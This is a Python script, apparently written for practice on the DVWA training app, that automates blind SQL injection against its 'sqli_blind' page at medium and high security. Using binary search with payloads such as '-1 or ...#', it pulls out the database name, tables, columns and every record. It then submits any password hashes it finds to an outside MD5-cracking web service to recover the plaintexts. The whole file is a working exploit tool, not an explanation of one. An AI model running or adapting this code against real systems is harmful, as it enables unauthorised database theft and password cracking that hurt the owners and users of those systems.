import re
import json
import requests


def decrypt_password(password: str):
    EMAIL = 'example@email.com'
    CODE = '****************'
    url = f"https://md5decrypt.net/en/Api/api.php?hash={password}&hash_type=md5&email={EMAIL}&code={CODE}"
    return requests.get(url).text


def isExpressTrue(url: str, payload: str, mode: str = '', security: str = 'medium'):
    COOKIES = {
        'PHPSESSID': '********************',
        'security': security
    }
    DATA = {
        'id': payload,
        'Submit': 'Submit'
    }
    if security == 'medium':
        html_page = requests.post(url=url, cookies=COOKIES, data=DATA).text
    elif security == 'high':
        requests.post(url=url+'cookie-input.php', cookies=COOKIES, data=DATA)
        # get response
        html_page = requests.get(url=url, cookies=COOKIES).text
    else:
        raise ValueError('security must be medium or high!')

    response = re.search(r'\s+</form>\s+<pre>(.*?)</pre>\s+</div>.*', html_page).group(1)
    if mode == 'debug':
        return response
    if response == 'User ID exists in the database.':
        return True
    elif response == 'User ID is MISSING from the database.':
        return False
    else:
        raise ValueError()


def binary_search(url: str, base_payload: str, mode: str = 'length', expand_length: int = 0, security: str = 'medium'):
    """
    二分法爆破
    :param url:
    :param base_payload:
    :param mode:
    :param expand_length: 用于扩展长度
    :param security:
    :return: 长度或字母的ascii编码
    """
    mode_map = {'length': 100, 'ascii': 127}
    left = 0
    try:
        right = mode_map[mode]
    except KeyError:
        raise ValueError('mode must be length or ascii!')

    right += expand_length

    while left < right:
        mid = (left + right) // 2
        if isExpressTrue(url, base_payload.format(f'>{mid}'), security):
            left = mid + 1
        else:
            right = mid
    if isExpressTrue(url, base_payload.format(f'={left}'), security):
        return left
    else:
        if left == mode_map[mode]:
            return binary_search(url, base_payload, mode, 1000, security)
        raise ValueError('\n' + base_payload.format(f'={left}'))


def sql_blind_inject(url: str, base_payload: str, security: str = 'medium'):
    if security not in ['medium', 'high']:
        raise ValueError('security must be medium or high!')

    result = {}

    # 爆破数据库名长度
    database_name_len = binary_search(url,
                                      base_payload.format('length(database()){}'),
                                      security=security)
    # 爆破数据库名
    database_name = ''
    for i in range(database_name_len):
        char = binary_search(url,
                             base_payload.format(f'ascii(substr(database(),{i + 1},1)){{}}'), 'ascii',
                             security=security)
        database_name += chr(char)
    print(f'{database_name=}')

    # 爆破拼接后全部表名长度
    database_table_names_len = binary_search(url,
                                             base_payload.format('length((select group_concat(table_name) from information_schema.tables where table_schema=database())){}'),
                                             security=security)
    print(f'{database_table_names_len=}')
    # 爆破拼接后表名
    table_names = ''
    for i in range(database_table_names_len):
        char = binary_search(url,
                             base_payload.format(f'ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i + 1},1)){{}}'),
                             'ascii',
                             security=security)
        table_names += chr(char)
    tables = table_names.split(',')
    print(f'{tables=}')

    tables_ = []
    for table in tables:
        table_ = {}
        print(f'\t{table=}')
        column_names_len = binary_search(url,
                                         base_payload.format(f'length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x{table.encode().hex()})){{}}'),
                                         security=security)
        # 爆破全部列名
        column_names = ''
        for i in range(column_names_len):
            char = binary_search(url,
                                 base_payload.format(f'ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x{table.encode().hex()}),{i + 1},1)){{}}'),
                                 'ascii',
                                 security=security)
            column_names += chr(char)
        columns = column_names.split(',')
        print(f"\t\tcolumns={(lambda x: x+['cipher'] if 'password' in x else x)(columns)}")

        # 爆破数据条数
        data_num = binary_search(url,
                                 base_payload.format(f'(select count(*) from {table}){{}}'),
                                 security=security)

        table_['table'] = table
        table_['columns'] = (lambda x: x+['cipher'] if 'password' in x else x)(columns)
        table_['record_nums'] = data_num
        table_['records'] = []
        for i in range(data_num):
            datum_len = binary_search(url,
                                      base_payload.format(f'length((select concat({(",0x"+",".encode().hex()+",").join(columns)}) from {table} limit {i},1)){{}}'),
                                      security=security)
            row_datum = ''
            for j in range(datum_len):
                char = binary_search(url,
                                     base_payload.format(f'ascii(substr((select concat({(",0x"+",".encode().hex()+",").join(columns)}) from {table} limit {i},1), {j + 1}, 1)){{}}'),
                                     'ascii',
                                     security=security)
                row_datum += chr(char)
            datum = row_datum.split(',')
            print(f'\t\t{datum=}')
            table_['records'].append({columns[i]: datum[i] for i in range(len(columns))})
            if 'password' in columns:
                table_['records'][-1]['cipher'] = decrypt_password(table_['records'][-1]['password'])
        tables_.append(table_)

    result['database'] = database_name
    result['tables'] = tables
    result['tables_info'] = tables_

    return result


TARGET_IP = '***.***.***.***'
result_medium = sql_blind_inject(f'http://{TARGET_IP}/vulnerabilities/sqli_blind/', "-1 or {}#")
result_high = sql_blind_inject(f'http://{TARGET_IP}/vulnerabilities/sqli_blind/', "-1 or {}#", security='high')

with open('../result/SQLInjectionBlind/result_medium.json', 'wt') as file:
    file.write(json.dumps(result_medium, indent=4))

with open('../result/SQLInjectionBlind/result_high.json', 'wt') as file:
    file.write(json.dumps(result_high, indent=4))
